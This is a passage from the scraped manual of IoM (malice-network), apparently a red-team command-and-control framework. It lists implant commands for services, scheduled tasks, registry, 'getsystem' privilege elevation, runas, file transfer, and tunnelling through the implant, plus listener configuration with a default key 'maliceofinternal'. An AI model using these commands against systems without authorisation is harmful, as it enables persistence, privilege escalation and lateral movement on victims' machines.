(LocalSystem, NetworkService; \\&lt;hostname\\&gt;\\\\\\&lt;username\\&gt; NT AUTHORITY\\SYSTEM; .\\username, ..) (default \"LocalSystem\")\n      --display string      Display name of the service\n      --error string        Error control level (Ignore, Normal, Severe, Critical) (default \"Normal\")\n      --name string         Name of the service (required)\n      --path string         Path to the executable (required)\n      --start_type string   Service start type (BootStart, SystemStart, AutoStart, DemandStart, Disabled) (default \"AutoStart\")\n```\n\n**SEE ALSO**\n\n* [service](#service)    - Perform service operations\n\n#### service delete\nDelete a specified service\n\n**Description**\n\nDelete a service by specifying its name, removing it from the system permanently.\n\n```\nservice delete [name]\n```\n\n**Examples**\n\nDelete a service named \"ExampleService\":\n  ~~~\n  service delete ExampleService\n  ~~~\n\n**SEE ALSO**\n\n* [service](#service)    - Perform service operations\n\n#### service list\nList all available services\n\n**Description**\n\nRetrieve and display a list of all services available on the system, including their configuration and current status.\n\n```\nservice list\n```\n\n**Examples**\n\nList all services:\n  ~~~\n  service list\n  ~~~\n\n**SEE ALSO**\n\n* [service](#service)    - Perform service operations\n\n#### service query\nQuery the status of a service\n\n**Description**\n\nRetrieve the current status and configuration of a specified service.\n\n```\nservice query [service_name]\n```\n\n**Examples**\n\nQuery the status of a service named \"example_service\":\n  ~~~\n  service query example_service\n  ~~~\n\n**SEE ALSO**\n\n* [service](#service)    - Perform service operations\n\n#### service start\nStart an existing service\n\n**Description**\n\nStart a service by specifying its name.\n\n```\nservice start [service_name]\n```\n\n**Examples**\n\nStart a service named \"example_service\":\n  ~~~\n  service start example_service\n  ~~~\n\n**SEE ALSO**\n\n* [service](#service)    - Perform service operations\n\n#### service stop\nStop a running service\n\n**Description**\n\nStop a service by specifying its name. This command will halt the service's operation.\n\n```\nservice stop [service_name]\n```\n\n**Examples**\n\nStop a service named \"example_service\":\n  ~~~\n  service stop example_service\n  ~~~\n\n**SEE ALSO**\n\n* [service](#service)    - Perform service operations\n\n### reg\nPerform registry operations\n\n**Description**\n\nManage Windows registry entries, including querying, adding, deleting, listing keys, and listing values.\n\n**SEE ALSO**\n\n* [reg add](#reg-add)    - Add or modify a registry key\n* [reg delete](#reg-delete)  - Delete a registry key\n* [reg list_key](#reg-list_key)  - List subkeys in a registry path\n* [reg list_value](#reg-list_value)  - List values in a registry path\n* [reg query](#reg-query)    - Query a registry key\n\n#### reg add\nAdd or modify a registry key\n\n**Description**\n\nAdd or modify a registry key with specified values. Supported types: REG_SZ, REG_BINARY, REG_DWORD, REG_QWORD\n\n```\nreg add [path] [flags]\n```\n\n**Examples**\n\nAdd or modify a registry key:\n  ~~~\n  reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example -v TestValue -t REG_DWORD -d 1\n  reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example -v TestString -t REG_SZ -d \"Hello World\"\n  reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example -v TestBinary -t REG_BINARY -d 01020304\n  ~~~\n\n**Options**\n\n```\n  -d, --data string    Data to set\n  -t, --type string    Value type (REG_SZ, REG_BINARY, REG_DWORD, REG_QWORD) (default \"REG_SZ\")\n  -v, --value string   Value name\n```\n\n**SEE ALSO**\n\n* [reg](#reg)    - Perform registry operations\n\n#### reg delete\nDelete a registry key\n\n**Description**\n\nRemove a specific registry key.\n\n```\nreg delete --hive [hive] --path [path] --key [key]\n```\n\n**Examples**\n\nDelete a registry key:\n  ~~~\n  reg delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example TestKey\n  ~~~\n\n**SEE ALSO**\n\n* [reg](#reg)    - Perform registry operations\n\n#### reg list_key\nList subkeys in a registry path\n\n**Description**\n\nRetrieve a list of all subkeys under a specified registry path.\n\n```\nreg list_key --hive [hive] --path [path]\n```\n\n**Examples**\n\nList subkeys in a registry path:\n  ~~~\n  reg list_key HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example\n  ~~~\n\n**SEE ALSO**\n\n* [reg](#reg)    - Perform registry operations\n\n#### reg list_value\nList values in a registry path\n\n**Description**\n\nRetrieve a list of all values under a specified registry path.\n\n```\nreg list_value --hive [hive] --path [path]\n```\n\n**Examples**\n\nList values in a registry path:\n  ~~~\n  reg list_value HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example\n  ~~~\n\n**SEE ALSO**\n\n* [reg](#reg)    - Perform registry operations\n\n#### reg query\nQuery a registry key\n\n**Description**\n\nRetrieve the value associated with a specific registry key.\n\n```\nreg query --hive [hive] --path [path] --key [key]\n```\n\n**Examples**\n\nQuery a registry key:\n  ~~~\n  reg query HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Example TestKey\n  ~~~\n\n**SEE ALSO**\n\n* [reg](#reg)    - Perform registry operations\n\n### taskschd\nManage scheduled tasks\n\n**Description**\n\nPerform operations related to scheduled tasks, including listing, creating, starting, stopping, and deleting tasks.\n\n**SEE ALSO**\n\n* [taskschd create](#taskschd-create)    - Create a new scheduled task\n* [taskschd delete](#taskschd-delete)    - Delete a scheduled task\n* [taskschd list](#taskschd-list)    - List all scheduled tasks\n* [taskschd query](#taskschd-query)  - Query the configuration of a scheduled task\n* [taskschd run](#taskschd-run)  - Run a scheduled task immediately\n* [taskschd start](#taskschd-start)  - Start a scheduled task\n* [taskschd stop](#taskschd-stop)    - Stop a running scheduled task\n\n#### taskschd create\nCreate a new scheduled task\n\n**Description**\n\nCreate a new scheduled task with the specified name, executable path, trigger type, and start boundary.\n\n```\ntaskschd create [flags]\n```\n\n**Examples**\n\nCreate a scheduled task:\n  ~~~\n  taskschd create --name ExampleTask --path /path/to/executable --trigger_type 1 --start_boundary \"2023-10-10T09:00:00\"\n  ~~~\n\n**Options**\n\n```\n      --name string             Name of the scheduled task (required)\n      --path string             Path to the executable for the scheduled task (required)\n      --start_boundary string   Start boundary for the scheduled task (e.g., 2023-10-10T09:00:00)\n      --trigger_type string     Trigger type for the task (e.g. Daily,Weekly,monthly)\n```\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n#### taskschd delete\nDelete a scheduled task\n\n**Description**\n\nDelete a scheduled task by specifying its name.\n\n```\ntaskschd delete [name]\n```\n\n**Examples**\n\nDelete a scheduled task:\n  ~~~\n  taskschd delete ExampleTask\n  ~~~\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n#### taskschd list\nList all scheduled tasks\n\n**Description**\n\nRetrieve a list of all scheduled tasks on the system.\n\n```\ntaskschd list\n```\n\n**Examples**\n\nList all scheduled tasks:\n  ~~~\n  taskschd list\n  ~~~\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n#### taskschd query\nQuery the configuration of a scheduled task\n\n**Description**\n\nRetrieve the current configuration, status, and timing information of a specified scheduled task by name.\n\n```\ntaskschd query [name]\n```\n\n**Examples**\n\nQuery the configuration of a scheduled task:\n  ~~~\n  taskschd query ExampleTask\n  ~~~\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n#### taskschd run\nRun a scheduled task immediately\n\n**Description**\n\nExecute a scheduled task immediately by specifying its name.\n\n```\ntaskschd run [name]\n```\n\n**Examples**\n\nRun a scheduled task immediately:\n  ~~~\n  taskschd run ExampleTask\n  ~~~\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n#### taskschd start\nStart a scheduled task\n\n**Description**\n\nStart a scheduled task by specifying its name.\n\n```\ntaskschd start [name]\n```\n\n**Examples**\n\nStart a scheduled task:\n  ~~~\n  taskschd start ExampleTask\n  ~~~\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n#### taskschd stop\nStop a running scheduled task\n\n**Description**\n\nStop a scheduled task by specifying its name.\n\n```\ntaskschd stop [name]\n```\n\n**Examples**\n\nStop a scheduled task:\n  ~~~\n  taskschd stop ExampleTask\n  ~~~\n\n**SEE ALSO**\n\n* [taskschd](#taskschd)  - Manage scheduled tasks\n\n### getsystem\nAttempt to elevate privileges\n\n```\ngetsystem\n```\n\n**Examples**\n\nAttempt to elevate privileges:\n  ~~~\n  getsystem\n  ~~~\n\n### privs\nList available privileges\n\n```\nprivs\n```\n\n**Examples**\n\nList available privileges:\n  ~~~\n  sys privs\n  ~~~\n\n### rev2self\nRevert to the original token\n\n```\nrev2self\n```\n\n**Examples**\n\nRevert to the original token:\n  ~~~\n  sys rev2self\n  ~~~\n\n### runas\nRun a program as another user\n\n```\nrunas --username [username] --domain [domain] --password [password] --program [program] --args [args] --use-profile --use-env --netonly [flags]\n```\n\n**Examples**\n\nRun a program as a different user:\n  ~~~\n  sys runas --username admin --domain EXAMPLE --password admin123 --program /path/to/program --args \"arg1 arg2\" --use-profile --use-env\n  ~~~\n\n**Options**\n\n```\n      --args string       Arguments for the program\n      --domain string     Domain of the user\n      --netonly           Use network credentials only\n      --password string   User password\n      --path string       Path to the program to execute\n      --use-env           Use user environment\n      --use-profile       Load user profile\n      --username string   Username to run as\n```\n\n### request\nSend HTTP request\n\n**Description**\n\nSend HTTP request to specified URL\n\n```\nrequest [url] [flags]\n```\n\n**Examples**\n</code></pre> request http://example.com</p> <p>request -X POST -d \"data\" http://example.com</p> <p>request -H \"Host: example.com\" -H \"User-Agent: custom\" http://example.com <pre><code>**Options**\n\n```\n  -d, --body string          request body\n  -H, --header stringArray   HTTP header (can be used multiple times)\n  -X, --method string        HTTP method (default \"GET\")\n  -t, --timeout int          request timeout in seconds (default 30)\n```\n\n## file\n### download\nDownload file\n\n**Description**\n\ndownload file in implant\n\n```\ndownload [implant_file] [flags]\n```\n\n**Examples**\n</code></pre> download ./file.txt <pre><code>**Options**\n\n```\n  -r, --dir   download dir\n```\n\n### upload\nUpload file\n\n**Description**\n\nupload local file to remote implant\n\n```\nupload [local] [remote] [flags]\n```\n\n**Examples**\n</code></pre> upload ./file.txt /tmp/file.txt <pre><code>**Options**\n\n```\n      --hidden        hidden file\n      --priv string   file privilege (default \"0644\")\n```\n\n### cat\nPrint file content\n\n**Description**\n\nconcatenate and display the contents of file in implant\n\n```\ncat [implant_file]\n```\n\n**Examples**\n</code></pre> cat file.txt           <pre><code>### cd\nChange directory\n\n**Description**\n\nchange the shell's current working directory in implant\n\n```\ncd\n```\n\n### chmod\nChange file mode\n\n**Description**\n\nchange the permissions of files and directories in implant\n\n```\nchmod [file] [mode]\n```\n\n**Examples**\n</code></pre> chmod ./file.txt 644 <pre><code>### chown\nChange file owner\n\n**Description**\n\nchange the ownership of a file or directory in implant\n\n```\nchown [file] [user] [flags]\n```\n\n**Examples**\n</code></pre> chown user ./file.txt  <pre><code>**Options**\n\n```\n  -g, --gid string   Group id\n  -r, --recursive    recursive\n```\n\n### cp\nCopy file\n\n**Description**\n\ncopy files and directories in implant\n\n```\ncp [source] [target]\n```\n\n**Examples**\n</code></pre> cp /tmp/file.txt /tmp/file2.txt  <pre><code>### ls\nList directory\n\n**Description**\n\nlist directory contents in implant\n\n```\nls [path]\n```\n\n**Examples**\n</code></pre> ls /tmp  <pre><code>### mkdir\nMake directory\n\n**Description**\n\nmake directories in implant\n\n```\nmkdir [path]\n```\n\n**Examples**\n</code></pre> mkdir /tmp <pre><code>### mv\nMove file\n\n**Description**\n\nmove files and directories in implant\n\n```\nmv [source] [target]\n```\n\n**Examples**\n</code></pre> mv /tmp/file.txt /tmp/file2.txt <pre><code>### pwd\nPrint working directory\n\n**Description**\n\nprint working directory in implant\n\n```\npwd\n```\n\n### rm\nRemove file\n\n**Description**\n\nremove files and directories in implant\n\n```\nrm [file]\n```\n\n**Examples**\n</code></pre> rm /tmp/file.txt <pre><code>### pipe\nManage named pipes\n\n**Description**\n\nPerform operations related to named pipes, including uploading, reading, and closing pipes.\n\n**SEE ALSO**\n\n* [pipe read](#pipe-read)    - Read data from a named pipe\n* [pipe upload](#pipe-upload)    - Upload file to a named pipe\n\n#### pipe read\nRead data from a named pipe\n\n**Description**\n\nRead data from a specified named pipe.\n\n```\npipe read [pipe_name]\n```\n\n**Examples**\n\nRead data from pipe:\n  ~~~\n  pipe read \\\\.\\pipe\\test_pipe\n  ~~~\n\n**SEE ALSO**\n\n* [pipe](#pipe)  - Manage named pipes\n\n#### pipe upload\nUpload file to a named pipe\n\n**Description**\n\nUpload the content of a specified file to a named pipe.\n\n```\npipe upload [pipe_name] [file_path]\n```\n\n**Examples**\n\nUpload file to pipe:\n  ~~~\n  pipe upload \\\\.\\pipe\\test_pipe /path/to/file\n  ~~~\n\n**SEE ALSO**\n\n* [pipe](#pipe)  - Manage named pipes\n\n## pivot\n### portfwd\nForward local port to remote target\n\n**Description**\n\nForward local port to remote target through the implant\n\n```\nportfwd [pipeline] [flags]\n```\n\n**Examples**\n\nForward local port to remote target:\n</code></pre> forward pipeline1 --port 8080 --target 192.168.1.1:80 <pre><code>**Options**\n\n```\n  -p, --port string     Local port to listen on\n  -t, --target string   Remote target address (host:port)\n```\n\n### portfwd_local\nForward local port to remote target\n\n```\nportfwd_local [pipeline] [agent] [flags]\n```\n\n**Options**\n\n```\n  -l, --local string   Local address to connect to (host:port)\n  -p, --port string    Local port to listen on\n```\n\n### proxy\nCreate a proxy through the implant\n\n**Description**\n\nCreate a proxy server through the implant with optional authentication\n\n```\nproxy [pipeline] [flags]\n```\n\n**Examples**\n\nCreate a proxy server:\n</code></pre> proxy pipeline1 --port 8080 <pre><code>**Options**\n\n```\n      --password string   Password for authentication (default \"maliceofinternal\")\n  -p, --port string       Local port to listen on\n      --protocol string   Inbound protocol (default \"socks5\")\n  -u, --username string   Username for authentication (default \"maliceofinternal\")\n```\n\n### rem_dial\nRun rem on the implant\n\n```\nrem_dial [pipeline] [args]\n```\n\n### reverse\nReverse port forward from remote to local\n\n**Description**\n\nCreate a reverse port forward from remote target to local through the implant\n\n```\nreverse [pipeline] [flags]\n```\n\n**Examples**\n\nCreate reverse port forward:\n</code></pre> reverse pipeline1 --port 12345 <pre><code>**Options**\n\n```\n      --password string   Password for authentication (default \"maliceofinternal\")\n  -p, --port string       Local port to listen on\n      --protocol string   Inbound protocol (default \"socks5\")\n  -u, --username string   Username for authentication (default \"maliceofinternal\")\n```\n\n### rportfwd\nRemote port forward through the implant\n\n**Description**\n\nCreate a remote port forward through the implant to connect back to a local port\n\n```\nrportfwd [pipeline] [flags]\n```\n\n**Examples**\n\nCreate remote port forward:\n</code></pre> rportforward pipeline1 --port 8080 --remote 192.168.1.1:80 ~~~</p> <p>Options</p> <p><code>-p, --port string     Local port to listen on   -r, --remote string   implant's address to connect to (host:port)</code></p>"},{"location":"IoM/manual/manual/implant/#rportfwd_local","title":"rportfwd_local","text":"<p>Remote port forward through the implant to client</p> <p><code>rportfwd_local [pipeline] [agent] [flags]</code></p> <p>Options</p> <p><code>-p, --port string     Local port to listen on   -r, --remote string   implant's internal address to connect to (host:port)</code></p>"},{"location":"IoM/manual/manual/listener/","title":"listener","text":"<p>\u5728v0.1.1\u5f00\u59cb\uff0cTLS \u6210\u4e3aimplant\u7684\u9ed8\u8ba4\u9009\u9879\uff0c \u5c06\u4e8ecert\u7ba1\u7406\u529f\u80fd\u6df1\u5ea6\u8054\u52a8</p> <p>\u5728v0.1.1\u6211\u4eec\u6dfb\u52a0\u4e86\u8bc1\u4e66\u7ba1\u7406\u529f\u80fd\uff0c\u80fd\u591f\u901a\u8fc7\u547d\u4ee4\u884c\u663e\u793a\u8bc1\u4e66\u5217\u8868\uff0c\u751f\u6210\u8bc1\u4e66\uff0c\u5220\u9664\u8bc1\u4e66\uff0c\u66f4\u65b0\u8bc1\u4e66\u3002\u4f60\u4e5f\u53ef\u4ee5\u7ed9pipeline\u6307\u5b9a\u8bc1\u4e66\uff0c\u91cd\u65b0\u542f\u52a8pipeline\uff0c\u4f7f\u7528tls\u529f\u80fd\u3002\u76ee\u524d\u6211\u4eec\u652f\u6301\u81ea\u7b7e\u540d\u8bc1\u4e66\u548c\u7528\u6237\u81ea\u884c\u5bfc\u5165\u8bc1\u4e66\u3002</p>"},{"location":"IoM/manual/manual/listener/#listener-config\u914d\u7f6e","title":"listener config\u914d\u7f6e","text":"<p>\u76ee\u524dlistener\u9700\u8981\u901a\u8fc7IoM\u7684Server\u7684\u540c\u7ea7\u76ee\u5f55\u4e0b\u7684config.yaml\u6765\u63a7\u5236, \u4ee5\u4e0b\u662flistener\u7684config\u793a\u4f8b\u914d\u7f6e <pre><code>listeners:                  # listener \u914d\u7f6e, \u53ef\u72ec\u7acb\u751f\u6548\n  name: listener  \n  auth: listener.auth  \n  enable: true  \n  ip: 127.0.0.1   \n  auto_build:\n    enable: true\n    build_pulse: true\n    target:\n      - x86_64-pc-windows-gnu\n    pipeline:\n      - tcp\n      - http\n  tcp:                      # tcp example            \n    - name: tcp             # tcp pipeline\n      port: 5001  \n      host: 0.0.0.0  \n      protocol: tcp  \n      parser: malefic       # auto/malefic/pulse\n      enable: true  \n      tls:                  # tls\u914d\u7f6e, \u6309\u7167\u914d\u7f6e\u751f\u6210\u8bc1\u4e66\u6216\u8005\u4f7f\u7528\u5df2\u6709\u7684\u8bc1\u4e66\u6587\u4ef6\n        enable: true  \n        # \u81ea\u7b7e\u540d\u8bc1\u4e66\n        CN: \"test\"  \n        O: \"Sharp Depth\"  \n        C: \"US\"  \n        L: \"Houston\"  \n        OU: \"Persistent Housework, Limited\"  \n        ST: \"State of Texas\"  \n        # \u81ea\u5b9a\u4e49\u8bc1\u4e66  \n        cert_file: \"\"  \n        key_file: \"\"  \n        ca_file: \"\"   \n      encryption:           # \u52a0\u5bc6\u914d\u7f6e, \u9700\u8981\u4e0eimplant\u5bf9\u5e94\n        - enable: true\n          type: aes\n          key: maliceofinternal\n        - enable: true\n          type: xor\n          key: maliceofinternal        \n  http: # http example\n    - name: http  \n      enable: true  \n      host: 0.0.0.0  \n      port: 8080  \n      parser: malefic       # auto/malefic/pulse\n      tls:  \n        enable: true  \n        CN: \"test\"  \n        O: \"Sharp Depth\"  \n        C: \"US\"  \n        L: \"Houston\"  \n        OU: \"Persistent Housework, Limited\"  \n        ST: \"State of Texas\"   \n        cert_file: \"\"  \n        key_file: \"\"  \n        ca_file: \"\"  \n      encryption:\n        - enable: true\n          type: aes\n          key: maliceofinternal\n        - enable: true\n          type: xor\n          key: maliceofinternal \n      error_page: \"\"  \n\n    - name: http-pulse  \n      enable: true  \n      host: 0.0.0.0  \n      port: 8081  \n      parser: pulse  \n      encryption:  \n        enable: true  \n        type: xor  \n        key: maliceofinternal  \n      error_page: \"\"  \n\n  bind:                    # bind \u542f\u52a8\u914d\u7f6e     \n    - name: bind_pipeline  \n      enable: true  \n      encryption:  \n        enable: true  \n        type: aes  \n        key: maliceofinternal \n\n  website:                 # website \u542f\u52a8\u914d\u7f6e\n    - name: default-website  \n      port: 80  \n      root: \"/\"  \n      enable: true  \n\n  rem:                     # rem \u542f\u52a8\u914d\u7f6e\n    - name: rem_default  \n      enable: true  \n      console: tcp://0.0.0.0:12345\n</code></pre></p>"},{"location":"IoM/manual/manual/listener/#\u57fa\u7840\u53c2\u6570\u914d\u7f6e","title":"\u57fa\u7840\u53c2\u6570\u914d\u7f6e","text":"<pre><code>listeners:                 \n  name: listener           # listener\u540d\u79f0\n  auth: listener.auth      # listener\u8bc1\u4e66\u4fe1\u606f\u8def\u5f84\n  enable: true     \n  ip: 127.0.0.1            # listener\u5916\u7f51ip\n</code></pre>"},{"location":"IoM/manual/manual/listener/#autobuild-\u914d\u7f6e","title":"autobuild \u914d\u7f6e","text":"<p>\u76ee\u524d\u542f\u52a8\u4e00\u4e2alistener\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7autobuild\u7684\u914d\u7f6e\uff0c\u6765\u63a7\u5236\u662f\u5426\u7f16\u8bd1\u4e0e\u5f53\u524dlistener\u901a\u4fe1\u7684implant\u3002\u4ee5\u4e0b\u662fautobuild\u914d\u7f6e\u793a\u4f8b\u3002 <pre><code>  auto_build:\n    enable: true\n    build_pulse: true\n    target:\n      - x86_64-pc-windows-gnu\n      - x86_64-unknown-linux-musl\n    pipeline:\n      - tcp\n      - http\n</code></pre></p> <p><code>enable</code> \u63a7\u5236\u662f\u5426\u8fdb\u884cautobuild\u3002 <code>build_pulse</code> \u63a7\u5236\u662f\u5426\u7f16\u8bd1\u5bf9\u5e94pipeline\u7684pulse artifact\u3002 <code>target</code> \u63a7\u5236\u81ea\u52a8\u7f16\u8bd1\u7684implant\u7684\u7cfb\u7edf\u67b6\u6784\uff0c\u652f\u6301\u591a\u4e2a\u7cfb\u7edf\u67b6\u6784\u4e00\u8d77\u7f16\u8bd1\u3002 <code>pipeline</code> \u63a7\u5236\u81ea\u52a8\u7f16\u8bd1\u7684implant\u5bf9\u5e94\u7684\u901a\u4fe1pipeline\uff0c\u9009\u62e9\u4e86\u51e0\u4e2apipeline\u5c31\u4f1a\u751f\u6210\u5bf9\u5e94\u6570\u91cf\u7684beacon implant\u3002 autobuild\u7684\u7f16\u8bd1\u5e73\u53f0\u4f18\u5148\u7ea7\u4e3adocker &gt; github action &gt; saas\uff0c\u82e5\u4f7f\u7528saas\u7f16\u8bd1\uff0c\u9700\u786e\u4fdd\u670d\u52a1\u7aef\u7684config.yaml\u914d\u7f6e\u4e86saas\uff0c\u5e76\u4e14\u670d\u52a1\u7aef\u672a\u542f\u52a8docker\uff0c\u4e5f\u6ca1\u6709\u5728config.yaml\u4e2d\u914d\u7f6egithub\u4ed3\u5e93\u4fe1\u606f\u3002</p>"},{"location":"IoM/manual/manual/listener/#pipeline-config\u914d\u7f6e","title":"pipeline config\u914d\u7f6e","text":"<p>pipeline \u8d1f\u8d23\u4e0eimplant\u7684\u901a\u8baf\uff0c\u53ef\u4ee5\u4e0eserver\u5206\u79bb\u90e8\u7f72\uff0c \u4e5f\u53ef\u4ee5\u540c\u65f6\u90e8\u7f72\u3002</p> <p>\u5f53\u524d\u652f\u6301\u591a\u79cd\u4fe1\u9053\uff0c \u4ee5\u53ca\u57fa\u4e8erem\u5b9e\u73b0\u7684\u62d3\u5c55\u4fe1\u9053\u3002  - \u57fa\u672c\u4fe1\u9053     - tcp     - http - rem: \u652f\u6301rem\u652f\u6301\u7684\u6240\u6709\u4fe1\u9053 https://wiki.chainreactors.red/rem/      - udp     - http     - tcp     - tls     - smb     - unix     - websocket     - icmp     - ... - bind, \u7528\u4e8e\u6b63\u5411\u8fde\u63a5 - website, \u7528\u4e8e\u5206\u53d1artifact\u4e0e\u6302\u8f7d\u6587\u4ef6</p>"},{"location":"IoM/manual/manual/listener/#tcp","title":"tcp","text":"<p>\u6700\u5e38\u7528\u7684 pipeline, \u9002\u7528\u4e8e\u4e3b\u4f53\u7a0b\u5e8f\u4ea4\u4e92\u7684 pipeline\u3002</p> <p>tcp \u662f\u76ee\u524d\u652f\u6301\u4e86\u6700\u591a\u7279\u6027\u7684 pipeline\u3002</p> <p>\u5355\u4e2a tcp pipeline \u914d\u7f6e:</p> <pre><code>  tcp:\n  - name: tcp_default       # tcp \u540d\u5b57\n        port: 5001          # tcp \u76d1\u542c\u7684\u7aef\u53e3\n        host: 0.0.0.0       # tcp \u76d1\u542c\u7684host\n        parser: malefic     # implant\u534f\u8bae\n        enable: true        # tcp \u662f\u5426\u5f00\u542f\n        tls:                # tls\u914d\u7f6e\u9879,\u7559\u7a7a\u5219\u81ea\u52a8\u751f\u6210\n          enable: false\n          CN: \"test\"\n          O: \"Sharp Depth\"\n          C: \"US\"\n          L: \"Houston\"\n          OU: \"Persistent Housework, Limited\"\n          ST: \"State of Texas\"\n          cert_file: \"\"\n          key_file: \"\"\n          ca_file: \"\"\n        encryption:\n          enable: true\n          type: aes\n          key: maliceofinternal\n</code></pre>"},{"location":"IoM/manual/manual/listener/#http","title":"http","text":"<p>http\u662f\u652f\u6301http\u534f\u8bae\u901a\u4fe1\u7684pipeline\uff0c\u548ctcp\u4e00\u6837\u652f\u6301\u6700\u591a\u7279\u6027\u3002</p> <p>\u5355\u4e2ahttp pipeline\u914d\u7f6e:</p> <pre><code>  http: \n    - name: http          # http \u540d\u5b57\n      enable: true        # http \u662f\u5426\u5f00\u542f\n      host: 0.0.0.0       # http \u76d1\u542c\u7684host\n      port: 8080          # http \u76d1\u542c\u7684\u7aef\u53e3\n      parser: malefic     # implant\u534f\u8bae\n      tls:                # tls\u914d\u7f6e\u9879,\u7559\u7a7a\u5219\u81ea\u52a8\u751f\u6210\n        enable: true  \n        CN: \"test\"  \n        O: \"Sharp Depth\"  \n        C: \"US\"  \n        L: \"Houston\"  \n        OU: \"Persistent Housework, Limited\"  \n        ST: \"State of Texas\"   \n        cert_file: \"\"  \n        key_file: \"\"  \n        ca_file: \"\"  \n      encryption:\n        - enable: true\n          type: aes\n          key: maliceofinternal\n        - enable: true\n          type: xor\n          key: maliceofinternal  \n</code></pre>"},{"location":"IoM/manual/manual/listener/#website","title":"website","text":"<p>IoM \u5141\u8bb8\u5c06\u4e00\u4e9b\u6587\u4ef6\u6302\u8f7d web \u670d\u52a1\u4e0a</p> <pre><code>  websites:             \n    - name: test                     # website \u540d\u5b57\n      port: 10049                    # website \u7aef\u53e3\n      root: \"/test\"                  # website route\u6839\u76ee\u5f55\n      enable: false                  # website \u662f\u5426\u5f00\u542f\n      content:                       # website \u6620\u5c04\u5185\u5bb9\n        - path: '\\images\\1.png'      # \u6587\u4ef6\u5728website\u7684\u6620\u5c04\u8def\u5f84\n          file: 'path\\to\\file'       # \u6587\u4ef6\u7684\u5b9e\u9645\u8def\u5f84\n          type: raw                  # \u6587\u4ef6\u7c7b\u578b\n        - path: '\\images\\2.png'\n          file: 'path\\to\\file'\n          type: raw\n</code></pre>"},{"location":"IoM/manual/manual/listener/#bind-unstable","title":"bind (Unstable)","text":"<p>\u4e3b\u52a8\u53d1\u9001\u6570\u636e\u7684 pipeline, \u4e0d\u540c\u4e8e tcp \u76d1\u542c\u7aef\u53e3. bind \u4f1a\u4e3b\u52a8\u5411\u76ee\u6807\u53d1\u9001\u5bf9\u5e94\u534f\u8bae\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e.</p> <pre><code>  bind:\n    -\n      name: bind_default            # bind \u540d\u5b57\n      enable: true                  # bind \u662f\u5426\u5f00\u542f\n      encryption:\n        enable: true\n        type: aes\n        key: maliceofinternal\n</code></pre>"},{"location":"IoM/manual/manual/listener/#rem-unstable","title":"rem (Unstable)","text":"<p>rem\u5728 IoM \u4e2d\u4e00\u7c7b\u6269\u5c55\u578b pipeline\uff0c\u5b83\u548c <code>tcp</code>\u3001<code>http</code> \u4e0d\u540c\uff0c\u662f\u4e00\u4e2a \u901a\u7528\u901a\u4fe1\u6846\u67b6\uff0c\u5b83\u628a IoM \u7684 implant \u901a\u4fe1\u80fd\u529b\u5bf9\u63a5\u5230\u4e86 rem \u9879\u76ee\uff0c\u56e0\u6b64\u53ef\u4ee5\u590d\u7528 rem \u63d0\u4f9b\u7684\u591a\u79cd\u96a7\u9053\u548c\u4ee3\u7406\u529f\u80fd\u3002</p> <pre><code>  rem:                     \n    - name: rem_default              # rem \u540d\u5b57\n      enable: true                   # rem \u662f\u5426\u5f00\u542f\n      console: tcp://0.0.0.0:12345   # rem \u63a7\u5236\u53f0\u76d1\u542c\u5730\u5740\u548c\u8fde\u63a5\u534f\u8bae\n</code></pre>"},{"location":"IoM/manual/manual/listener/#listener-\u547d\u4ee4\u7ba1\u7406","title":"listener \u547d\u4ee4\u7ba1\u7406","text":"<p>\u5728\u786e\u4fdd Malice-Network \u670d\u52a1\u5668\u5df2\u7ecf\u8fd0\u884c\u540e\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u4ee5\u4e0b\u6307\u4ee4\uff1a</p> <pre><code>.\\malice-network listener add [listener_name]\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u6210\u529f\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\u5e76\u5728\u6240\u5904\u6587\u4ef6\u5939\u4e0b\u751f\u6210\u5bf9\u5e94 auth \u914d\u7f6e\u6587\u4ef6\uff1a</p> <p>\u4e5f\u53ef\u4ee5\u5220\u9664\u7528\u6237, \u4f7f\u5176\u65e0\u6cd5\u767b\u5f55 server</p> <pre><code>.\\malice-network listener del [listener_name]\n</code></pre> <p>\u5217\u51fa\u6240\u6709\u53ef\u7528\u7684\u7528\u6237\u914d\u7f6e</p> <pre><code>.\\malice-network listener list\n</code></pre>"},{"location":"IoM/manual/manual/listener/#pipeline-\u547d\u4ee4\u7ba1\u7406","title":"pipeline \u547d\u4ee4\u7ba1\u7406","text":""},{"location":"IoM/manual/manual/listener/#\u57fa\u672c\u7528\u6cd5","title":"\u57fa\u672c\u7528\u6cd5","text":""},{"location":"IoM/manual/manual/listener/#\u65b0\u5efatcp","title":"\u65b0\u5efatcp","text":"<pre><code>tcp --listener listener --host 127.0.0.1 --port 5015\n</code></pre> <p>gui: </p>"},{"location":"IoM/manual/manual/listener/#\u65b0\u5efatcp\u5e76\u5f00\u542ftls","title":"\u65b0\u5efatcp\u5e76\u5f00\u542ftls","text":"<p>\u5176\u4ed6pipeline\u6253\u5f00tls\u65b9\u5f0f\u76f8\u540c</p> <pre><code>tcp --listener listener --host 127.0.0.1 --port 5015 --tls --cert-name cert-name\n</code></pre> <p></p> <p>gui: </p>"},{"location":"IoM/manual/manual/listener/#\u65b0\u5efahttp","title":"\u65b0\u5efahttp","text":"<pre><code>http --listener listener --host 127.0.0.1 --port 8083\n</code></pre> <p>gui: 